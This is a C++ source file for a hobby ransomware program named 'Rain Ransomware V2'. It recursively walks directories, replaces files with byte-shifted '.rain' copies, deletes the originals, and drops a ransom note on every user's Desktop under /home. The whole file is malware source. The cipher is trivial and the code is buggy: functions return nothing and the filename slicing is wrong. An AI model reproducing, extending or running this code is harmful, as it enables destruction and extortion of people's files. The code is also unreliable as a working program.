#include <iostream>
#include <filesystem>
#include <fstream>
#include <vector>

bool encryptFile(std::string filePath)
{
    std::string tempFilePath ="/tmp/" + filePath.substr(filePath.find_last_of("/") + 1, filePath.find_last_of(".")) + ".rain";
    std::fstream file(filePath, std::ios::in | std::ios::binary);
    std::fstream tempfile(tempFilePath, std::ios::out | std::ios::binary);

    file.seekg(0, file.end);
    int size = file.tellg();

    file.seekg(0, file.beg);

    char buffer[size];
    file.read(buffer, size);

    for (int i = 0; i < size; i++) {
        buffer[i] += 1;
    }

    tempfile.write(buffer, size);

    file.close();
    tempfile.close();
    remove(filePath.c_str());
    std::filesystem::copy_file(tempFilePath, filePath.substr(0, filePath.find_last_of("/")) + tempFilePath.substr(4));
    remove(tempFilePath.c_str());
}

bool decryptFile(std::string filePath)
{
    std::string tempFilePath ="/tmp/" + filePath.substr(filePath.find_last_of("/") + 1, filePath.find_last_of(".")) + ".rain";
    std::fstream file(filePath, std::ios::in | std::ios::binary);
    std::fstream tempfile(tempFilePath, std::ios::out | std::ios::binary);

    file.seekg(0, file.end);
    int size = file.tellg();
    std::cout << "size: " << size << std::endl;

    file.seekg(0, file.beg);

    char buffer[size];
    file.read(buffer, size);

    for (int i = 0; i < size; i++) {
        buffer[i] -= 1;
    }

    tempfile.write(buffer, size);

    file.close();
    tempfile.close();
    remove(filePath.c_str());
    std::filesystem::copy_file(tempFilePath, filePath.substr(0, filePath.find_last_of("/")) + tempFilePath.substr(4, tempFilePath.length() - 14));
    remove(tempFilePath.c_str());
}

bool encryptDir(std::string Path, bool encrypt)
{
    for(const auto& file : std::filesystem::directory_iterator(Path))
    {
        if (file.is_directory())
        {
            encryptDir(file.path(), encrypt);
        } else
        {
            if(encrypt)
            {
                encryptFile(file.path());
            }
            else
            {
                decryptFile(file.path());
            }
        }
    }
}

int main() {
    std::string startingDir = "/home/eap2004/RanTest/";

    encryptDir(startingDir, false);

    std::vector<std::string> userPaths;
    for(const auto& users : std::filesystem::directory_iterator("/home/"))
    {
        if(users.is_directory())
        {
            userPaths.push_back(users.path());
        }
    }

    std::string ranNote = "This is a test note for Rain Ransomware V2, Sorry if this affects you :D";
    for(std::string path : userPaths)
    {
        for(auto dir : std::filesystem::directory_iterator(path))
        {
            if(dir.path().filename() == "Desktop")
            {
                std::fstream note (dir.path().string() + "/Note.txt", std::ios::out);
                note << ranNote;
                note.close();
            }
        }
    }

    return 0;
}
